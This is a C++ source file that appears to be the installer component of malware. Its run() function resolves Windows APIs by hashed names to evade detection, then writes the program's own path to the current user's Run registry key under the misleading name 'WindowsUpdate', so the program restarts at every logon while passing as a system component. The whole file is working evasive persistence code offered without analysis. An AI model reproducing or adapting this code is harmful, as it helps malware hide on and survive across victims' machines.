#include "Install.h"
#include "evasive/ApiHash.h"

#include <windows.h>

namespace inst {

void run() {
    auto gp = api::resolve<decltype(&GetModuleFileNameA)>(
        API_HASH("kernel32.dll"), API_HASH("GetModuleFileNameA"));
    auto rok = api::resolve<decltype(&RegOpenKeyExA)>(
        API_HASH("advapi32.dll"), API_HASH("RegOpenKeyExA"));
    auto rsv = api::resolve<decltype(&RegSetValueExA)>(
        API_HASH("advapi32.dll"), API_HASH("RegSetValueExA"));
    auto rck = api::resolve<decltype(&RegCloseKey)>(
        API_HASH("advapi32.dll"), API_HASH("RegCloseKey"));
    if (!gp || !rok || !rsv || !rck) return;

    char path[MAX_PATH] = {};
    gp(nullptr, path, MAX_PATH);

    HKEY h = nullptr;
    if (rok(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, KEY_SET_VALUE, &h) != 0) return;
    rsv(h, "WindowsUpdate", 0, REG_SZ, reinterpret_cast<const BYTE*>(path), static_cast<DWORD>(strlen(path) + 1));
    rck(h);
}

} // namespace inst
